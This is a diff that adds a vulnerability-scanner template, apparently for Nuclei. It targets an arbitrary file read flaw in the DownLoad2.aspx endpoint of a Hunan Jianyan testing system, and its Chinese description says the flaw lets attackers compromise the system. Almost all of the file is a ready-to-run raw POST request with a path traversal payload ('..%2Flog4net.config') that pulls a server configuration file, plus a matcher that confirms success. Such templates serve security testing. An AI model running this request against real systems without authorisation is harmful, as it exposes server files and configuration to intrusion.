@@ -1,0 +1,27 @@
+id: hunanjianyan-DownLoad2-fileread
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 湖南建研检测系统存在DownLoad2.aspx任意文件读取漏洞，导致系统被攻击与控制。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8DownLoad2.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /Common/DownLoad2.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 32
+
+        path=..%2Flog4net.config&Name=
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
